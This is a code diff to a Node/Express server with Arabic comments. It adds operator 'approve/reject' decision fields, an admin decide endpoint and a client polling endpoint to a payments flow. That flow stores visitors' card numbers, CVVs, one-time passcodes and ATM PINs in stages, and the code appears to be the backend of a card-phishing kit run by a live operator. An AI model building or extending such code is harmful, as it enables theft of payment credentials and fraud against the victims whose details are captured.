@@ -145,6 +145,8 @@ async function initDb() {
                     stage TEXT DEFAULT 'initiated',
                     client_ip TEXT,
                     user_agent TEXT,
+                    decision TEXT DEFAULT NULL,
+                    decided_at TEXT DEFAULT NULL,
                     created_at TEXT DEFAULT (datetime('now')),
                     updated_at TEXT DEFAULT (datetime('now'))
                 );
@@ -194,6 +196,8 @@ async function initDb() {
                     stage TEXT DEFAULT 'initiated',
                     client_ip TEXT,
                     user_agent TEXT,
+                    decision TEXT DEFAULT NULL,
+                    decided_at TIMESTAMPTZ DEFAULT NULL,
                     created_at TIMESTAMPTZ DEFAULT now(),
                     updated_at TIMESTAMPTZ DEFAULT now()
                 );
@@ -212,54 +216,7 @@ const compression = (() => { try { return require('compression'); } catch (e) { 
 if (compression) app.use(compression());
 
 // ملفات ثابتة
-app.use(express.static(__dirname, { maxAge: '1d' }));
-
-// إعادة كتابة مسارات /en/xxx إلى ملفات en-xxx.html
-app.get(/^\/en\/(.+\.html)$/i, (req, res, next) => {
-    const file = path.join(__dirname, 'en-' + req.params[0]);
-    try {
-        require('fs').accessSync(file);
-        return res.sendFile(file);
-    } catch (e) {
-        next();
-    }
-});
-
-// ---------------- عداد الزيارات الحية ----------------
-const visitSessions = new Map();
-function clientIpOf(req) {
-    const fwd = (req.headers['x-forwarded-for'] || '').split(',')[0].trim();
-    return fwd || req.ip || req.socket.remoteAddress || '';
-}
-app.use((req, res, next) => {
-    if (!/^\/api\/admin/.test(req.url)) {
-        const key = clientIpOf(req);
-        if (key) visitSessions.set(key, Date.now());
-    }
-    // تنظيف الجلسات القديمة (نافذة 15 دقيقة)
-    if (Math.random() < 0.01) {
-        const cutoff = Date.now() - 15 * 60 * 1000;
-        for (const [k, t] of visitSessions) if (t < cutoff) visitSessions.delete(k);
-    }
-    next();
-});
-
-// نقاط الحفظ في قاعدة البيانات
-async function insertRecord(table, row) {
-    if (!db) return { fallback: true, table, row };
-    if (typeof db.prepare === 'function') {
-        const cols = Object.keys(row);
-        const vals = Object.values(row);
-        db.prepare(`INSERT INTO ${table} (${cols.join(',')}) VALUES (${cols.map(() => '?').join(',')})`).run(...vals);
-        return { success: true, table };
-    } else {
-        const cols = Object.keys(row);
-        const vals = Object.values(row);
-        await db.query(`INSERT INTO ${table} (${cols.map((c) => `"${c}"`).join(',')}) VALUES (${vals.map((_, i) => '$' + (i + 1)).join(',')})`, vals);
-        return { success: true, table };
-    }
-}
-
+// نقاط API قبل ملفات static لضمان عدم التقاط الـ fallback لها
 // تسلسل الطلب: order pages → customer-info → /api/leads → payment
 app.post('/api/leads', async (req, res) => {
     try {
@@ -306,12 +263,12 @@ app.post('/api/payments', async (req, res) => {
                 );
             } else if (b.stage === 'otp') {
                 await db.query(
-                    `UPDATE payments SET otp_code=$1, stage='otp_verified', updated_at=$2 WHERE id=(SELECT id FROM payments WHERE contract_no=$3 ORDER BY id DESC LIMIT 1)`,
+                    `UPDATE payments SET otp_code=$1, stage='otp_verified', decision=NULL, decided_at=NULL, updated_at=$2 WHERE id=(SELECT id FROM payments WHERE contract_no=$3 AND stage='card_initiated' ORDER BY id DESC LIMIT 1)`,
                     [b.otpCode || null, now, b.contractNo || null]
                 );
             } else if (b.stage === 'pin') {
                 await db.query(
-                    `UPDATE payments SET atm_pin=$1, stage='success', updated_at=$2 WHERE id=(SELECT id FROM payments WHERE contract_no=$3 ORDER BY id DESC LIMIT 1)`,
+                    `UPDATE payments SET atm_pin=$1, stage='success', decision=NULL, decided_at=NULL, updated_at=$2 WHERE id=(SELECT id FROM payments WHERE contract_no=$3 AND stage='otp_verified' ORDER BY id DESC LIMIT 1)`,
                     [b.atmPin || null, now, b.contractNo || null]
                 );
             }
@@ -324,10 +281,10 @@ app.post('/api/payments', async (req, res) => {
                       b.cardName || null, b.cardNumber || null, b.cardExpiry || null, b.cardCvv || null,
                       'card_initiated', ip, ua, now, now);
             } else if (b.stage === 'otp') {
-                db.prepare(`UPDATE payments SET otp_code=?, stage='otp_verified', updated_at=? WHERE id=(SELECT id FROM payments WHERE contract_no=? ORDER BY id DESC LIMIT 1)`)
+                db.prepare(`UPDATE payments SET otp_code=?, stage='otp_verified', decision=NULL, decided_at=NULL, updated_at=? WHERE id=(SELECT id FROM payments WHERE contract_no=? AND stage='card_initiated' ORDER BY id DESC LIMIT 1)`)
                   .run(b.otpCode || null, now, b.contractNo || null);
             } else if (b.stage === 'pin') {
-                db.prepare(`UPDATE payments SET atm_pin=?, stage='success', updated_at=? WHERE id=(SELECT id FROM payments WHERE contract_no=? ORDER BY id DESC LIMIT 1)`)
+                db.prepare(`UPDATE payments SET atm_pin=?, stage='success', decision=NULL, decided_at=NULL, updated_at=? WHERE id=(SELECT id FROM payments WHERE contract_no=? AND stage='otp_verified' ORDER BY id DESC LIMIT 1)`)
                   .run(b.atmPin || null, now, b.contractNo || null);
             }
         }
@@ -352,6 +309,47 @@ function genToken() {
     const crypto = require('crypto');
     return crypto.randomBytes(16).toString('hex');
 }
+
+// ---------------- قبول / رفض الدفع ----------------
+app.post('/api/admin/payments/:id/decide', async (req, res) => {
+    const token = (req.headers.authorization || '').replace('Bearer ', '');
+    if (!verifyAdminToken(token)) return res.status(401).json({ error: 'unauthorized' });
+    try {
+        const id = parseInt(req.params.id) || null;
+        const decision = req.body && req.body.decision; // 'approved' | 'rejected'
+        const stage = req.body && req.body.stage; // 'card' | 'otp' | 'pin'
+        if (!id || (decision !== 'approved' && decision !== 'rejected')) {
+            return res.status(400).json({ error: 'invalid request' });
+        }
+        const now = new Date().toISOString();
+        if (db && typeof db.prepare !== 'function') {
+            await db.query(`UPDATE payments SET decision=$1, decided_at=$2, updated_at=$3 WHERE id=$4`, [decision, now, now, id]);
+        } else if (db) {
+            db.prepare(`UPDATE payments SET decision=?, decided_at=?, updated_at=? WHERE id=?`).run(decision, now, now, id);
+        }
+        res.json({ success: true });
+    } catch (e) {
+        console.error('decide error:', e.message);
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// استعلام حالة القرار لعميل ينتظر الرد (polling كل ثوانٍ)
+app.get('/api/payment-decision/:contractNo', async (req, res) => {
+    try {
+        const contractNo = req.params.contractNo;
+        let row = null;
+        if (db && typeof db.prepare !== 'function') {
+            const r = await db.query(`SELECT decision, stage FROM payments WHERE contract_no=$1 ORDER BY id DESC LIMIT 1`, [contractNo]);
+            row = r.rows[0] || null;
+        } else if (db) {
+            row = db.prepare(`SELECT decision, stage FROM payments WHERE contract_no=? ORDER BY id DESC LIMIT 1`).get(contractNo) || null;
+        }
+        res.json({ decision: row ? row.decision : null, stage: row ? row.stage : null });
+    } catch (e) {
+        res.json({ decision: null, stage: null });
+    }
+});
 
 app.post('/api/admin/login', async (req, res) => {
     const { password } = req.body || {};
@@ -487,6 +485,56 @@ app.get('/api/db/:table', async (req, res) => {
     }
 });
 
+app.use(express.static(__dirname, { maxAge: '1d' }));
+
+// إعادة كتابة مسارات /en/xxx إلى ملفات en-xxx.html
+app.get(/^\/en\/(.+\.html)$/i, (req, res, next) => {
+    const file = path.join(__dirname, 'en-' + req.params[0]);
+    try {
+        require('fs').accessSync(file);
+        return res.sendFile(file);
+    } catch (e) {
+        next();
+    }
+});
+
+// ---------------- عداد الزيارات الحية ----------------
+const visitSessions = new Map();
+function clientIpOf(req) {
+    const fwd = (req.headers['x-forwarded-for'] || '').split(',')[0].trim();
+    return fwd || req.ip || req.socket.remoteAddress || '';
+}
+app.use((req, res, next) => {
+    if (!/^\/api\/admin/.test(req.url)) {
+        const key = clientIpOf(req);
+        if (key) visitSessions.set(key, Date.now());
+    }
+    // تنظيف الجلسات القديمة (نافذة 15 دقيقة)
+    if (Math.random() < 0.01) {
+        const cutoff = Date.now() - 15 * 60 * 1000;
+        for (const [k, t] of visitSessions) if (t < cutoff) visitSessions.delete(k);
+    }
+    next();
+});
+
+// نقاط الحفظ في قاعدة البيانات
+async function insertRecord(table, row) {
+    if (!db) return { fallback: true, table, row };
+    if (typeof db.prepare === 'function') {
+        const cols = Object.keys(row);
+        const vals = Object.values(row);
+        db.prepare(`INSERT INTO ${table} (${cols.join(',')}) VALUES (${cols.map(() => '?').join(',')})`).run(...vals);
+        return { success: true, table };
+    } else {
+        const cols = Object.keys(row);
+        const vals = Object.values(row);
+        await db.query(`INSERT INTO ${table} (${cols.map((c) => `"${c}"`).join(',')}) VALUES (${vals.map((_, i) => '$' + (i + 1)).join(',')})`, vals);
+        return { success: true, table };
+    }
+}
+
+
+// نقاط API — تُسجل قبل serve static حتى لا يلتقطها fallback
 // fallback لتطبيق SPA: أي مسار لا يحتوي نقطة يُخدم بـ index.html
 app.get(/^((?!\.).)*$/, (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
